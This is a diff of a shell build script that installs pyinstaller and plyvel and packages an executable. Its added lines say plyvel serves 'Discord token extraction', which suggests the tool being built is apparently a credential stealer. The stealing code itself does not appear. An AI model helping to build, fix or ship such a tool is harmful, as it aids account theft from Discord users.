@@ -68,32 +68,14 @@ fi
 echo "[*] Installing Python dependencies..."
 pip install pyinstaller
 
-# Compile plyvel with correct linking flags
+# Install plyvel (Discord token extraction)
 if [ "$OS" = "macos" ]; then
-    echo "[*] Compiling plyvel for macOS..."
-    export LDFLAGS="-L/opt/homebrew/opt/leveldb/lib"
-    export CPPFLAGS="-I/opt/homebrew/opt/leveldb/include"
-    pip install --no-cache-dir --force-reinstall --no-binary=plyvel plyvel
-
-    # Fix library references with install_name_tool
-    echo "[*] Fixing library references with install_name_tool..."
-    PLYVEL_SO=$(find ./venv -name "_plyvel*.so" 2>/dev/null | head -1)
-    if [ -f "$PLYVEL_SO" ]; then
-        echo "[*] Found: $PLYVEL_SO"
-        install_name_tool -add_rpath /opt/homebrew/opt/leveldb/lib "$PLYVEL_SO" 2>/dev/null || true
-        otool -L "$PLYVEL_SO" | grep -q leveldb && echo "[✓] Library references fixed" || echo "[!] Check if references are correct"
-    else
-        echo "[!] Could not find _plyvel.so"
-    fi
+    echo "[*] macOS: Discord token extraction not supported (leveldb linking issues)"
+    echo "[*] All other features work normally!"
 else
-    echo "[*] Installing plyvel (pre-compiled)..."
+    echo "[*] Installing plyvel for Discord token extraction..."
     pip install plyvel
 fi
-
-echo "[*] Verifying plyvel installation..."
-python3 -c "import plyvel; print(f'plyvel {plyvel.__version__} OK')" || {
-    echo "[WARNING] plyvel not available, continuing without Discord support"
-}
 
 echo "[*] Building executable: $BINARY_NAME"
 pyinstaller \
